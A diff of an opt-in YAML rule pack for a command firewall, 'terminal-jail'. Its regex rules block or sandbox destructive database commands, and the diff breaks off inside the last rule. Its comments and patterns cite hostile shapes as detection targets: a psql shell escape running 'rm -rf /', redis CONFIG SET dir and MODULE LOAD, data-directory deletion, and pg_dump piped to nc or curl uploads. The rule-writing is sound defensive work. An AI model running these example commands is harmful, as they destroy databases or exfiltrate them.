@@ -1,4 +1,5 @@
-# terminal-jail OPT-IN rule pack: db — database-destructive shapes (TJ-GAP-061)
+# terminal-jail OPT-IN rule pack: db — database-destructive shapes
+# (TJ-GAP-061 mechanism, TJ-GAP-062 full catalogue)
 #
 # This file is NOT part of the shipped default rule set. It is installed only
 # when the operator explicitly asks for it:
@@ -35,112 +36,391 @@
 # shadow a builtin: a same-id rules.d entry replaces the builtin in its layer,
 # which is exactly the silent-override class this contract closes.
 #
-# SCOPE (DF-TERMINAL-JAIL-23) — the two block rules match EXECUTION CONTEXT:
-# a destructive statement counts only when a SQL client (psql, mysql, mariadb,
-# sqlite3, mysqladmin, sqlplus) is part of the command AND the statement sits
-# in an execution position — immediately after the client's -c/-e/--command/
-# --execute flag, after a SELECT/WITH prefix inside that same flag string (a
-# multi-statement string), or as a quoted statement argument of a client that
-# takes statements positionally (sqlite3/sqlplus basics). A SQL client IS now
-# required; a statement merely carried as text is not matched. Measured
-# through the bridge (dogfood 2026-09-19), this closes the remediation
-# deadlock where the pack blocked the commands that REMOVE the statement:
-#   blocked:  `psql -c "DROP DATABASE prod"`, `psql -c "DROP TABLE users"`,
-#             `mysql -e "DROP TABLE users;"`
+# EXECUTION CONTEXT (DF-TERMINAL-JAIL-23) — the SQL rules match a destructive
+# statement only when a SQL client (psql, mysql, mariadb, sqlite3, mysqladmin,
+# sqlplus) is part of the command AND the statement sits in an execution
+# position: immediately after the client's -c/-e/--command/--execute flag, after
+# a semicolon inside that flag string (a multi-statement string), after a CLOSED
+# quoted literal inside it, or as a quoted statement argument of a client that
+# takes statements positionally (sqlite3/sqlplus). A SQL client IS required; a
+# statement merely carried as text is not matched. Measured through the bridge
+# (dogfood 2026-09-19), this closes the remediation deadlock where the pack
+# blocked the commands that REMOVE the statement:
+#   blocked:  `psql -c "DROP DATABASE prod"`, `mysql -e "DROP TABLE users;"`
 #   allowed:  `sed -i "s/DROP DATABASE/-- DROP DATABASE/" ...`,
 #             `git commit -am "park the DROP DATABASE migration"`,
 #             read-only strings that merely contain the words
 #             (`psql -c "SELECT msg FROM t WHERE msg = 'drop database retry'"`),
 #             `grep -rn "DROP TABLE" migrations/`, `echo "DROP TABLE ..." > f`,
 #             `psql -f migrations/002_legacy.sql`
+#
+# GRAY-ZONE DOCTRINE (TJ-GAP-062) — destructive-but-GRAY shapes are SANDBOXED
+# (`action: sandbox`, priority 650), never blocked:
+#   * a single-table DROP (`DROP TABLE ...`, CASCADE or not) — one table's rows;
+#   * a TRUNCATE of one table (no CASCADE / RESTART IDENTITY);
+#   * bulk dump/restore tooling.
+# Blocks (950) are reserved for the whole-store shapes: whole-database/schema
+# destruction, FK-closure `TRUNCATE ... CASCADE`, admin shutdown, the redis RCE
+# pair, recursive delete of a live data directory, and the dump-to-network
+# exfil. A sandbox still CONTAINS the command (namespace wrap): it runs.
+# NOTE this is a DELIBERATE verdict change from the DF-TERMINAL-JAIL-23
+# mechanism-proof pack, which blocked `DROP TABLE`; the doctrine above is the
+# authority (TJ-GAP-062), and the DF-23 false-positive fix — execution-context
+# matching — is preserved unchanged.
+#
 # KNOWN RESIDUALS — accepted, documented, deliberately NOT fixed here:
 #   (a) SQL inside a file passed with -f is invisible to the firewall (the
 #       engine only sees the command string, never the file body) — that is
 #       DF-TERMINAL-JAIL-10 and is still open.
 #   (b) destructive SQL pasted into a NON-SQL-client interpreter
 #       (`python3 -c "import sqlite3; sqlite3.connect('x').execute('DROP ...')"`
-#       and friends) is no longer caught — that is the accepted cost of
-#       requiring an execution context. The previous shape rules caught the
-#       words anywhere, and with them also blocked the remediation commands
-#       above (dogfood 2026-09-19), which is the worse trade.
-#   (c) the SELECT/WITH arm stops at the first quote/semicolon inside the -c
-#       string, so a CTE whose data span contains either before the DROP is
-#       not matched; the sqlite3/sqlplus positional arm is anchored only by
-#       the client token, so quoted text following those two clients is
-#       best-effort.
-# The wider catalogue (psql `\!` escape, mysql SHUTDOWN, redis CONFIG) is
-# TJ-GAP-062 and is deliberately NOT in this file — this pack exists to prove
-# the mechanism end-to-end.
+#       and friends) is not caught — the accepted cost of requiring an
+#       execution context. The previous shape rules caught the words anywhere
+#       and with them blocked the remediation commands above (dogfood
+#       2026-09-19), which is the worse trade.
+#   (c) the engine never sees SQL that arrives through a heredoc body or a
+#       `< file` redirect as an execution position — the parser splits those
+#       into separate segments — so both keep their pre-existing verdict.
+#   (d) `find ... -delete` is NOT claimed here: the builtin
+#       `builtin-vm-delete` already blocks every `find -exec/-delete` in the
+#       whole-command pass, so a second rule would only duplicate a builtin id.
+#   (e) the delete rule reads the COMMAND, so a path that reaches `rm` through a
+#       variable or a command substitution (`D=$DIR; rm -rf $D`) is not matched.
+#   (f) the exfil rule's pipe arm is reachable ONLY in the form the wrapper
+#       produces (see MECHANISM NOTES). Through the Python API with a BARE pipe
+#       (`intercept("pg_dump db | nc host 4444")`) the parser splits the command
+#       at the operator, so this per-segment rule sees only the dump stage and
+#       the vector comes out `modify` / `pack-db-dump-restore` (sandboxed, still
+#       running) instead of `block`. Closing that needs an ENGINE change — the
+#       decider's whole-command pass covers builtin block rules only, and
+#       widening it to Layer 4 would re-order pack rules ahead of the
+#       always-allow layer for every host — so it is reported, not worked
+#       around. The wrapper path (the one an operator actually uses) blocks.
+#
+# FULL CATALOGUE (TJ-GAP-062) — the deferral note that used to sit here is
+# GONE: this file now carries the whole researched catalogue. Rules, in
+# priority order (block 950 first, then the gray sandboxes at 650):
+#
+#   BLOCK (950) — always an attack or a disaster, never routine:
+#     pack-db-psql-meta-shell    psql `\!` meta-command (arbitrary shell via the
+#                                DB client): the escape must OPEN a -c/-e/
+#                                --command/--execute argument, sit directly
+#                                after the psql word, or follow a quote
+#     pack-db-drop-database      DROP DATABASE / DROP SCHEMA (block or
+#                                CASCADE), execution context only
+#     pack-db-truncate-cascade   TRUNCATE ... CASCADE (the FK-closure spelling)
+#     pack-db-admin-shutdown     mysqladmin / mariadb-admin shutdown
+#     pack-db-redis-config       redis-cli CONFIG SET dir|dbfilename, CONFIG
+#                                REWRITE
+#     pack-db-redis-module       redis-cli MODULE LOAD|UNLOAD (the redis RCE
+#                                pattern)
+#     pack-db-redis-flush        redis-cli FLUSHALL / FLUSHDB
+#     pack-db-mongosh-drop       mongosh/mongo dropDatabase() / drop()
+#     pack-db-mongosh-shutdown   mongosh/mongo adminCommand shutdown
+#     pack-db-data-dir-delete    delete of a live DB data path
+#                                (/var/lib/postgresql|mysql|mariadb|mongodb|redis
+#                                trees, or a *.duckdb file)
+#     pack-db-dump-exfil         pg_dump/mysqldump piped straight to a network
+#                                target (nc, a curl upload flag, wget
+#                                --post-file) — the exfil shape
+#
+#   SANDBOX (650) — destructive but gray; the command still runs, wrapped:
+#     pack-db-drop-table         a single-table DROP TABLE
+#     pack-db-truncate           a TRUNCATE with no CASCADE/RESTART IDENTITY
+#     pack-db-dump-restore       bulk dump/restore tooling
+#
+# LEGIT PINS (proved in plugin/test_rule_pack_db.py) — the fleet runs these for
+# real work and NONE of them may be attributed to this pack:
+#   plain `psql -c 'SELECT ...'`; `psql -f migration.sql`; `sqlite3 db 'INSERT
+#   ...'` (our state.db/role.db live there); alembic / `python -c` ORM usage;
+#   `pg_dump` to a local file; `redis-cli GET/SET`; `mysqladmin status`.
+#
+# MECHANISM NOTES — both measured through intercept() on the dev host:
+#   * the decider's whole-command pass iterates the BUILTIN blocklist only. A
+#     pack rule carries a new id and therefore lives in Layer 4, which is
+#     evaluated PER SEGMENT (decider.evaluate -> _evaluate_segment). Consequence:
+#     a pack pattern never sees a shell operator, because the parser removes them
+#     from each segment's `raw`. A pipe-spanning shape is still matchable in the
+#     form the WRAPPER produces: standalone/terminal-jail single-quotes every
+#     argv token, so `pg_dump db | nc h p` reaches the engine as
+#     `'pg_dump' 'db' '|' 'nc' 'h' 'p'` — ONE segment, because a quoted `|` is
+#     not an operator — and the matcher's quote-stripped candidate
+#     (`_normalize_quoted`) turns it back into `pg_dump db | nc h p`. The
+#     exfil rule keys on exactly that.
+#   * the `pipeline` match type documented in README / specs §3.2 is
+#     UNREACHABLE: parse_command only ever emits SegmentType.SIMPLE, so
+#     `_match_pipeline`'s `segment.type != PIPE` branch is the only one taken
+#     and its `"|" in normalized` test can never be true. Every rule here uses
+#     `pattern`.
+#   * a builtin BLOCK rule claims its vector in the whole-command pass BEFORE
+#     Layer 4 is reached. `pg_dump db | curl -T - ...` is therefore reported as
+#     `builtin-net-curl-upload`, not as `pack-db-dump-exfil` — the pack's curl
+#     arm is the BACKSTOP for a host that has overridden that builtin to `warn`.
+#     One vector, one stable rule id.
+#
+# PROVEN BY plugin/test_rule_pack_db.py: every rule below fires on its own
+# vector through intercept(), every false-positive context above stays
+# un-attributed, every legit pin keeps its verdict, and every gray shape comes
+# out `modify`.
 
 rules:
-  # ---------------------------------------------------------------------------
-  # DROP DATABASE — destroys a whole database, including every object in it.
-  # ---------------------------------------------------------------------------
+  - id: "pack-db-psql-meta-shell"
+    description: "psql meta-shell escape (\\! runs a shell command via the DB client)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: a psql `\\!` meta-command executes an arbitrary SHELL command through the database client — it must OPEN a -c/-e/--command/--execute argument, follow the psql word, or follow a quote. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d if a workflow genuinely needs it. To run SQL, use a plain -c \"SELECT ...\", -f <file>, or your ORM."
+    match:
+      type: composite
+      operator: and
+      conditions:
+        - type: pattern
+          pattern: "(?:^|[;&|])[^A-Za-z0-9_]*psql\\b"
+        - type: pattern
+          #                         # The `\!` meta-command, in every shape psql accepts:
+          #                         #   psql -c "\! rm -rf /"   double-quoted flag argument
+          #                         #   psql -c '\! sh'         single-quoted flag argument
+          #                         #   psql -c \! sh           unquoted flag argument
+          #                         #   psql --command=\! sh    =-joined long flag
+          #                         #   psql -c'\! sh'          flag attached to its argument
+          #                         #   psql \! sh              bare escape after the psql word
+          #                         # The escape must OPEN the flag argument, which is what
+          #                         # keeps a legitimate SQL argument out: psql treats a -c
+          #                         # string as SQL unless it BEGINS with a backslash, so
+          #                         #   psql -c "SELECT * FROM t WHERE col \! 0"
+          #                         # is a syntax error, not a shell escape, and stays
+          #                         # ALLOWED (pinned by a test). Requiring the psql token
+          #                         # likewise keeps the rule off text that merely CONTAINS
+          #                         # the escape (`sed -i 's/\\!/--/' migrations/x.sql`,
+          #                         # `printf '\!\\n' > f`) and off a backslash-exclamation
+          #                         # inside a longer escape (`\\!`, `x\!`).
+          #
+          pattern: "(?:(?:-[ce]\\s*['\\\"]?\\s*|--(?:command|execute)(?:=|\\s+)\\s*['\\\"]?\\s*)\\\\!|(?<![\\w-])psql\\b\\s+['\\\"]?\\\\!)"
   - id: "pack-db-drop-database"
-    description: "DROP DATABASE statement (whole-database destruction)"
+    description: "DROP DATABASE / DROP SCHEMA statement (whole-database or schema destruction)"
     priority: 950
     action: block
-    block_message: "Blocked by the optional 'db' rule pack: a DROP DATABASE statement destroys an entire database. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d if a workflow genuinely needs it."
+    block_message: "Blocked by the optional 'db' rule pack: a DROP DATABASE / DROP SCHEMA statement destroys an entire database or schema. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d if a workflow genuinely needs it."
     match:
       type: composite
       operator: and
-      # (1) a SQL client is part of the command, and (2) the statement sits in
-      # an execution position (DF-TERMINAL-JAIL-23). Arm A: immediately after
-      # the client's -c/-e/--command/--execute flag (optionally behind ONE
-      # quote char — the wrapper's argv quoting or the shell's own). Arm B1:
-      # inside a -c/-e string, after a semicolon (`-c "SELECT 1; DROP ..."`).
-      # Arm B2: inside a -c/-e string, after a CLOSED quoted literal
-      # (`-c "SELECT ... WHERE x = 'a' ; DROP ..."`). The closed-literal
-      # requirement is what keeps a read-only string like
-      # `psql -c "SELECT msg FROM t WHERE msg = 'drop database retry'"`
-      # ALLOWED — there the words sit INSIDE the literal, never behind a
-      # closed one — while the multi-statement forms still block. Arm C:
-      # sqlite3/sqlplus take a statement as a positional argument
-      # (`sqlite3 app.db 'DROP TABLE x'`); tempered-dot anchors it to the
-      # client so bare statement text alone never fires.
       conditions:
         - type: pattern
-          pattern: "(?<![\\w-])(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
+          pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
         - type: pattern
-          pattern: "(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])drop\\s+(?:database|schema)\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])drop\\s+(?:database|schema)\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\\\"]*(?<![\\w-])drop\\s+(?:database|schema)\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!\\bdrop\\s+(?:database|schema)\\b).)*(?<![\\w-])['\\\"](?![\\w-]*\\s*(?:and|or|not|in|like|between|is|where|select|from)\\b)[^'\\\"]*(?<![\\w-])drop\\s+(?:database|schema)\\b"
-
-  # ---------------------------------------------------------------------------
-  # DROP TABLE — destroys a table and its rows.
-  # ---------------------------------------------------------------------------
+          #                         # Arm A: immediately after the client's -c/-e/--command/
+          #                         # --execute flag (optionally behind ONE quote char).
+          #                         # Arm B1: after a semicolon inside the flag string
+          #                         # (`-c "SELECT 1; DROP DATABASE x"`). Arm B2: after a
+          #                         # CLOSED quoted literal inside the flag string
+          #                         # (`-c "SELECT ... = 'a' ; DROP DATABASE x"`) — the
+          #                         # closed-literal requirement is what keeps the read-only
+          #                         # string
+          #                         # `psql -c "SELECT msg FROM t WHERE msg = 'drop database
+          #                         # retry'"` ALLOWED: there the words sit INSIDE the
+          #                         # literal, never behind a closed one. Arm C: positional
+          #                         # statement argument after sqlite3/sqlplus. No CASCADE
+          #                         # guard here — `DROP SCHEMA ... CASCADE` is the same hard
+          #                         # block.
+          #
+          pattern: "(?:(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])drop\\s+(?:database|schema)\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])drop\\s+(?:database|schema)\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\"]*(?<![\\w-])drop\\s+(?:database|schema)\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!drop\\s+(?:database|schema)\\b).)*(?<![\\w-])['\\\"][^'\"]*(?<![\\w-])drop\\s+(?:database|schema)\\b)"
+  - id: "pack-db-truncate-cascade"
+    description: "TRUNCATE ... CASCADE (FK-closure truncation)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: `TRUNCATE ... CASCADE` empties the target table AND every table that references it through a foreign key — the FK closure is the destructive part. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. A TRUNCATE of one table with no CASCADE is auto-sandboxed (pack-db-truncate), not blocked."
+    match:
+      type: composite
+      operator: and
+      conditions:
+        - type: pattern
+          pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
+        - type: pattern
+          #                         # The CASCADE tail is anchored AFTER the statement
+          #                         # (`[^;'"]*?\bcascade\b`), so the keyword must QUALIFY this
+          #                         # truncate rather than merely coexist in the command. The
+          #                         # table list is permissive (`TRUNCATE a, b CASCADE`,
+          #                         # `TRUNCATE ONLY a CASCADE`, `TRUNCATE TABLE a CASCADE`
+          #                         # all match).
+          #
+          pattern: "(?:(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])truncate\\b[^;'\\\"]*?\\bcascade\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])truncate\\b[^;'\\\"]*?\\bcascade\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\"]*(?<![\\w-])truncate\\b[^;'\\\"]*?\\bcascade\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!truncate\\b[^;'\\\"]*?\\bcascade\\b).)*(?<![\\w-])['\\\"][^'\"]*(?<![\\w-])truncate\\b[^;'\\\"]*?\\bcascade\\b)"
+  - id: "pack-db-admin-shutdown"
+    description: "mysqladmin/mariadb-admin shutdown (stops the database server)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: `mysqladmin shutdown` / `mariadb-admin shutdown` stops the database server (a denial of service on every client, and a common step in wiping a host's data). This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. Other mysqladmin verbs (status, ping, processlist) are untouched."
+    match:
+      type: pattern
+      #                 # The admin client token, then connection flags, then the
+      #                 # `shutdown` VERB. The verb is matched as a whole word and must be
+      #                 # followed by a boundary, so `mysqladmin status` and a connection
+      #                 # whose VALUE merely contains the word (`-h shutdown-db.internal`)
+      #                 # are not matched. `mariadb-admin` is the MariaDB spelling of the
+      #                 # same tool. A `'`/`"` is tolerated between the flag and the verb
+      #                 # because the wrapper's argv quoting survives into the segment
+      #                 # text (`mysqladmin '-u' 'root' 'shutdown'`).
+      #
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:mysqladmin|mariadb-admin)\\b(?:[^|;&]|'[^']*'|\\\"[^\\\"]*\\\")*?[\\s'\\\"]+shutdown(?:[\\s'\\\"]|$|[|;&])"
+  - id: "pack-db-redis-config"
+    description: "redis-cli CONFIG SET dir/dbfilename or CONFIG REWRITE (RCE + persistence)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: `redis-cli CONFIG SET dir` / `CONFIG SET dbfilename` redirects redis's RDB dump into an attacker-chosen path (the write-a-file-anywhere half of the redis RCE pattern), and `CONFIG REWRITE` persists it. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. Ordinary redis reads/writes (GET, SET, HGET, ...) are untouched."
+    match:
+      type: pattern
+      #                 # `CONFIG SET <dir|dbfilename>` (optionally quoted) or
+      #                 # `CONFIG REWRITE`. The quote-aware gap lets the scan cross a
+      #                 # quoted `&` in a connection URL while an unquoted operator still
+      #                 # ends it. `CONFIG GET dir` (a diagnostic read) is deliberately
+      #                 # NOT matched.
+      #
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*redis-cli\\b(?:[^|;&]|'[^']*'|\\\"[^\\\"]*\\\")*?[\\s'\\\"]config[\\s'\\\"]+set[\\s'\\\"]+(?:dir|dbfilename)\\b|(?:^|[;&|])[^A-Za-z0-9_]*redis-cli\\b(?:[^|;&]|'[^']*'|\\\"[^\\\"]*\\\")*?[\\s'\\\"]config[\\s'\\\"]+rewrite\\b"
+  - id: "pack-db-redis-module"
+    description: "redis-cli MODULE LOAD/UNLOAD (native code execution in the server)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: `redis-cli MODULE LOAD <file>` loads a shared object into the redis server process — arbitrary native code execution at the server's privilege (the second half of the redis RCE pattern). This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d."
+    match:
+      type: pattern
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*redis-cli\\b(?:[^|;&]|'[^']*'|\\\"[^\\\"]*\\\")*?[\\s'\\\"]module[\\s'\\\"]+(?:load|unload)\\b"
+  - id: "pack-db-redis-flush"
+    description: "redis-cli FLUSHALL/FLUSHDB (deletes every key)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: `redis-cli FLUSHALL` / `FLUSHDB` deletes every key in the server (or in the selected database). This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d if a scratch instance genuinely needs it. The ASYNC/SYNC modifier is covered too."
+    match:
+      type: pattern
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*redis-cli\\b(?:[^|;&]|'[^']*'|\\\"[^\\\"]*\\\")*?[\\s'\\\"]flush(?:all|db)\\b"
+  - id: "pack-db-mongosh-drop"
+    description: "mongosh/mongo database drop (dropDatabase() / drop())"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: a mongosh/mongo `dropDatabase()` (or `db.<collection>.drop()`) destroys a database or collection. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. Plain queries (`mongosh --eval \"db.stats()\"`) are untouched."
+    match:
+      type: pattern
+      #                 # Anchored on the mongo shell's own client token, so text that
+      #                 # merely MENTIONS the call (a grep argument, a sed replacement, a
+      #                 # quoted data literal) is not matched. `[\s\S]*` lets the call sit
+      #                 # anywhere in the --eval argument or in a positional script.
+      #
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:mongosh|mongo)\\b[\\s\\S]*?\\.\\s*drop(?:database)?\\s*\\("
+  - id: "pack-db-mongosh-shutdown"
+    description: "mongosh/mongo server shutdown (adminCommand shutdown)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: a mongosh/mongo shutdown (`db.adminCommand({shutdown: 1})` or the bare `{shutdown: 1}` form) stops the database server — a denial of service on every client. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d."
+    match:
+      type: pattern
+      pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:mongosh|mongo)\\b[\\s\\S]*?(?:admincommand\\s*\\(\\s*\\{\\s*)?shutdown\\s*:\\s*1"
+  - id: "pack-db-data-dir-delete"
+    description: "Delete of a live DB data path (/var/lib DB trees, *.duckdb)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: a delete (`rm`, recursive or not) aimed at a live database data path — the /var/lib/postgresql, /var/lib/mysql, /var/lib/mariadb, /var/lib/mongodb and /var/lib/redis trees, or a *.duckdb file — destroys the database itself. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. Deleting a dump, a log or an unrelated temporary file is NOT matched."
+    match:
+      type: pattern
+      #                 # Two halves joined by LOOKAHEADS (so their order cannot matter and
+      #                 # a shell operator cannot split them):
+      #                 #   (1) a DELETE command — `rm` as its own argv word. The
+      #                 #       token-start boundary keeps the rule off every word that
+      #                 #       merely CONTAINS `rm`, and the flag scan is bounded to the
+      #                 #       same argv word, so `git rm -rf node_modules` (a `git`
+      #                 #       subcommand with no data path) is not matched.
+      #                 #   (2) a DATA PATH — the /var/lib DB trees, matched by PREFIX
+      #                 #       exactly as the catalogue writes them (`postgresql*`,
+      #                 #       `mysql*`, ...), so any path UNDER a data dir is covered and
+      #                 #       so is a sibling tree such as `/var/lib/mysql-backup` (a
+      #                 #       whole backup recursively deleted is the same disaster); or
+      #                 #       a `*.duckdb` FILE, matched with a boundary that rejects a
+      #                 #       longer word (`board.duckdb2`) but accepts a suffix
+      #                 #       (`role.duckdb.bak`).
+      #                 # A recursive flag is deliberately NOT required: the PATH is what
+      #                 # makes the shape destructive, and `rm <dir>` is only meaningful
+      #                 # with -r anyway. `find ... -delete` is not claimed — the builtin
+      #                 # `builtin-vm-delete` already blocks every `find -exec/-delete`.
+      #
+      pattern: "(?=[\\s\\S]*(?<!\\S)rm\\s)(?=[\\s\\S]*(?:/var/lib/(?:postgresql|mysql|mariadb|mongodb|redis)|[^\\s|;&]*\\.duckdb(?![\\w-])))"
+  - id: "pack-db-dump-exfil"
+    description: "pg_dump/mysqldump piped to a network target (database exfiltration)"
+    priority: 950
+    action: block
+    block_message: "Blocked by the optional 'db' rule pack: a database dump (`pg_dump`, `pg_dumpall`, `mysqldump`) piped straight into a network client (nc/ncat/netcat/socat) or an upload tool (`curl -T`, `curl -d @`, `wget --post-file`) sends a complete copy of the database to a remote host. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d. A dump written to a local file (`pg_dump mydb > dump.sql`, `pg_dump mydb | gzip > dump.sql.gz`) stays untouched."
+    match:
+      type: pattern
+      #                 # The dump tool, then the pipe operator, then a network SINK. The
+      #                 # operator may appear bare or wrapped in quote characters, because
+      #                 # the matcher tests the raw segment AND a quote-stripped candidate —
+      #                 # and the WRAPPER single-quotes every argv token, so a real
+      #                 # `pg_dump db | nc h p` arrives as `'pg_dump' 'db' '|' 'nc' 'h'
+      #                 # 'p'` (ONE segment: a quoted `|` is not an operator) and the
+      #                 # stripped candidate is the bare pipe form again. The sink arms:
+      #                 #   * nc/ncat/netcat/socat — a raw socket;
+      #                 #   * curl with an UPLOAD flag (-T/--upload-file,
+      #                 #     -d/--data*/--data-binary with @) — a plain download
+      #                 #     (`curl -s https://...`) is not a sink;
+      #                 #   * wget --post-file/--body-file.
+      #                 # Intermediate stages are allowed for, so
+      #                 # `pg_dump mydb | gzip | nc host 4444` matches. `nc -z host port`
+      #                 # has no dump on the left and `pg_dump mydb > /tmp/dump.sql` has no
+      #                 # network sink, so both stay out (the latter is sandboxed by
+      #                 # pack-db-dump-restore). NOTE: a builtin block rule claims some of
+      #                 # the same vectors in the earlier whole-command pass
+      #                 # (`pg_dump db | curl -T - ...` is reported as
+      #                 # `builtin-net-curl-upload`) — this arm is the BACKSTOP for a host
+      #                 # that has overridden that builtin to `warn`.
+      #
+      pattern: "(?<![\\w-])(?:pg_dump|pg_dumpall|mysqldump)\\b(?=[\\s\\S]*?\\s(?:\\||[|]['\\\"])\\s*['\\\"]*(?:(?:nc|ncat|netcat|socat)\\b|curl\\b[^|;&]*(?:-{1,2}upload-file|-{1,2}data(?:-binary|-raw)?|-[A-Za-z]*[Td])\\b\\s*@?\\S|wget\\b[^|;&]*--(?:post-file|body-file)\\b))"
   - id: "pack-db-drop-table"
-    description: "DROP TABLE statement (table destruction)"
-    priority: 950
-    action: block
-    block_message: "Blocked by the optional 'db' rule pack: a DROP TABLE statement destroys a table and its contents. This rule is not part of the default rule set — remove it with `./install.sh --unrule-pack db`, or override this id to warn level with a same-id user rule in your rules.d if a workflow genuinely needs it (a scratch/temp table drop included)."
+    description: "Single-table DROP TABLE (gray: namespace wrap, command still runs)"
+    priority: 650
+    action: sandbox
+    block_message: "Auto-sandboxed by the optional 'db' rule pack: a DROP TABLE statement destroys a table and its rows. Gray-zone doctrine: a single-table drop is destructive but scoped, so the command still runs under namespace isolation rather than being refused. Whole-store destruction (DROP DATABASE / DROP SCHEMA) is blocked instead."
     match:
       type: composite
       operator: and
-      # Same execution-context shape as DROP DATABASE above (DF-TERMINAL-JAIL-23):
-      # a SQL client AND the statement in an execution position — immediately
-      # after the -c/-e/--command/--execute flag (arm A), after a semicolon or
-      # a CLOSED quoted literal inside the flag string (arms B1/B2), or
-      # positionally quoted after sqlite3/sqlplus (arm C). `IF EXISTS` matches
-      # the same arms (the DROP token starts the tail).
       conditions:
         - type: pattern
-          pattern: "(?<![\\w-])(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
+          pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
         - type: pattern
-          pattern: "(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])drop\\s+table\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])drop\\s+table\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\\\"]*(?<![\\w-])drop\\s+table\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!\\bdrop\\s+table\\b).)*(?<![\\w-])['\\\"](?![\\w-]*\\s*(?:and|or|not|in|like|between|is|where|select|from)\\b)[^'\\\"]*(?<![\\w-])drop\\s+table\\b"
-
-  # ---------------------------------------------------------------------------
-  # Bulk dump / restore tooling — dual use, so it is SANDBOXED, not blocked.
-  # ---------------------------------------------------------------------------
+          #                         # Same execution-context arms as DROP DATABASE
+          #                         # (DF-TERMINAL-JAIL-23) — the false-positive class DF-23
+          #                         # closed stays closed. CASCADE and a multi-table list are
+          #                         # covered by the same rule: both are still a drop of named
+          #                         # tables.
+          #
+          pattern: "(?:(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])drop\\s+table\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])drop\\s+table\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\"]*(?<![\\w-])drop\\s+table\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!drop\\s+table\\b).)*(?<![\\w-])['\\\"][^'\"]*(?<![\\w-])drop\\s+table\\b)"
+  - id: "pack-db-truncate"
+    description: "TRUNCATE of a single table (gray: namespace wrap, command still runs)"
+    priority: 650
+    action: sandbox
+    block_message: "Auto-sandboxed by the optional 'db' rule pack: a TRUNCATE empties a table's rows — legitimate maintenance, so the command still runs under namespace isolation. The FK-closure spelling `TRUNCATE ... CASCADE` is blocked instead by pack-db-truncate-cascade."
+    match:
+      type: composite
+      operator: and
+      conditions:
+        - type: pattern
+          pattern: "(?:^|[;&|])[^A-Za-z0-9_]*(?:psql|mysql|mariadb|sqlite3|mysqladmin|sqlplus)\\b"
+        - type: pattern
